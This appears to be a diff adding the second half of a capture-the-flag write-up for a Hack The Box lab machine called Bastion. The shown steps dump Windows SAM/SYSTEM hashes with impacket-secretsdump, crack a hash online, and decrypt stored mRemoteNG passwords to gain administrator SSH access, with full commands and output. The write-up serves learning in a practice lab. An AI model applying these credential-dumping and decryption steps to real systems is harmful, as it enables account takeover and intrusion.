@@ -264,5 +264,194 @@ We can cd to /mnt/vhd and view the contents. I had to sudo -i as root on the att
 
 ```
 
+The Users directory had "L4mpje" user but no flags in it. So, following ippsec's video, I learned that **Windows password files are stored in SAM and SYSTEM in Windows/System32/config**
+
+We copied the SAM and SYSTEM files to our htb working folder for Bastion.
+
+SAM and SYSTEM files seem to be binary files, I could not read much. But I learned from ippsec's video that **impacket-secretsdump tool can be used to dump password hashes from SAM and SYSTEM files**. From the help section, I see it "Performs various techniques to dump secrets from the remote machine without executing any agent there".
+
+```
+$impacket-secretsdump -sam SAM -system SYSTEM local
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+[*] Cleaning up... 
+```
+
+The admin and guest password hashes seem to be the same, so in this backup, admin password seems to be disabled. I searched online for L4mpje password hash - 26112010952d963c8dc4217daec986d9. https://hashes.com/en/decrypt/hash was an easy place to search for the LM hash, and the result was
+
+```
+26112010952d963c8dc4217daec986d9:bureaulampje
+```
+I was able to ssh as l4mpje and password bureaulampje.
+
+```
+$ssh l4mpje@10.10.10.134
+The authenticity of host '10.10.10.134 (10.10.10.134)' can't be established.
+ECDSA key fingerprint is SHA256:ILc1g9UC/7j/5b+vXeQ7TIaXLFddAbttU86ZeiM/bNY.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.134' (ECDSA) to the list of known hosts.
+l4mpje@10.10.10.134's password: 
+
+Microsoft Windows [Version 10.0.14393]                                          
+(c) 2016 Microsoft Corporation. All rights reserved.                            
+
+l4mpje@BASTION C:\Users\L4mpje>  
+```
+user.txt was in the Desktop folder of L4mpje.
+
+I began browsing through the file system. In "Program Files (x86)", I saw mRemoteNG. I know it is a Putty-like tool for remote login. 
+
+Back to ippsec again. I learned that mRemoteNG password decryption was easy. There is a python script to decrypt mRemoteNG password. 
+
+Online search shows that mRemoteNG stores password config in confCons.xml in \Users\L4mpje\AppData\Roaming\mRemoteNG.
+
+```
+type C:\Users\L4mpje\AppData\Roaming\mRemoteNG>type confCons.xml
+<?xml version="1.0" encoding="utf-8"?>                                          
+<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="f
+alse" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFile
+Encryption="false" Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL
+5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA" ConfVersion="2.6">                      
+    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" 
+Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Pas
+sword="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7em
+f7lWWA10dQKiw==" Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Setti
+ngs" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE"
+ ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToI
+dleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bi
+t" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" Disp
+layThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" C
+acheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPri
+nters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality=
+"Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacA
+ddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHexti
+le" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0
+" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode
+="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostna
+me="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPass
+word="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" Inh
+eritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="fa
+lse" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" 
+InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="
+false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" I
+nheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPort
+s="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" Inhe
+ritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" I
+nheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp
+="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryp
+tionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToId
+leTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="fal
+se" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false"
+ InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" In
+heritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" 
+InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="f
+alse" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSi
+zeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" In
+heritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" 
+InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatew
+ayDomain="false" />                                                             
+    <Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="Ge
+neral" Id="8d3579b2-e68e-48c1-8f0f-9ee1347c9128" Username="L4mpje" Domain="" Pas
+sword="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZV
+vla8esB" Hostname="192.168.1.75" Protocol="RDP" PuttySession="Default Settings" 
+Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAE
+ncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTi
+meout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Re
+solution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayTh
+emes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheB
+itmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters
+="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dyna
+mic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddres
+s="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" V
+NCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNC
+ProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="Sma
+rtSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname=""
+ RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword=
+"" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritD
+escription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" 
+InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" Inher
+itDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false
+" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" Inheri
+tRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="fa
+lse" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRe
+directSound="false" InheritSoundQuality="false" InheritResolution="false" Inheri
+tAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="fal
+se" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionS
+trength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTim
+eout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" I
+nheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" Inhe
+ritUserField="false" InheritExtApp="false" InheritVNCCompression="false" Inherit
+VNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" Inher
+itVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false"
+ InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMod
+e="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" Inherit
+RDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" Inher
+itRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDom
+ain="false" />                                                                  
+</mrng:Connections>  
+```
+
+Using the Python script from https://github.com/haseebT/mRemoteNG-Decrypt, I was able to decrypt L4mpje and Administrator passwords.
 
 
+```
+$python3 mremoteng_decrypt.py -s yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB
+Password: bureaulampje
+
+$python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
+Password: thXLHM96BeKL0ER2
+```
+Now I can ssh as administrator
+
+```
+$ssh administrator@10.10.10.134
+administrator@10.10.10.134's password: 
+
+Microsoft Windows [Version 10.0.14393]                                          
+(c) 2016 Microsoft Corporation. All rights reserved.                            
+
+administrator@BASTION C:\Users\Administrator>dir                                
+ Volume in drive C has no label.                                                
+ Volume Serial Number is 0CB3-C487                                              
+
+ Directory of C:\Users\Administrator                                            
+
+25-04-2019  05:08    <DIR>          .                                           
+25-04-2019  05:08    <DIR>          ..                                          
+23-02-2019  09:40    <DIR>          Contacts                                    
+23-02-2019  09:40    <DIR>          Desktop                                     
+23-02-2019  09:40    <DIR>          Documents                                   
+23-02-2019  09:40    <DIR>          Downloads                                   
+23-02-2019  09:40    <DIR>          Favorites                                   
+23-02-2019  09:40    <DIR>          Links                                       
+23-02-2019  09:40    <DIR>          Music                                       
+23-02-2019  09:40    <DIR>          Pictures                                    
+23-02-2019  09:40    <DIR>          Saved Games                                 
+23-02-2019  09:40    <DIR>          Searches                                    
+23-02-2019  09:40    <DIR>          Videos                                      
+               0 File(s)              0 bytes                                   
+              13 Dir(s)  11.250.294.784 bytes free                              
+
+administrator@BASTION C:\Users\Administrator>cd Desktop                         
+
+administrator@BASTION C:\Users\Administrator\Desktop>dir                        
+ Volume in drive C has no label.                                                
+ Volume Serial Number is 0CB3-C487                                              
+
+ Directory of C:\Users\Administrator\Desktop                                    
+
+23-02-2019  09:40    <DIR>          .                                           
+23-02-2019  09:40    <DIR>          ..                                          
+23-02-2019  09:07                32 root.txt                                    
+               1 File(s)             32 bytes                                   
+               2 Dir(s)  11.250.294.784 bytes free                              
+
+administrator@BASTION C:\Users\Administrator\Desktop>type root.txt  
+```
+
+Overall, this machine was a good exercise. Learned a lot of things.
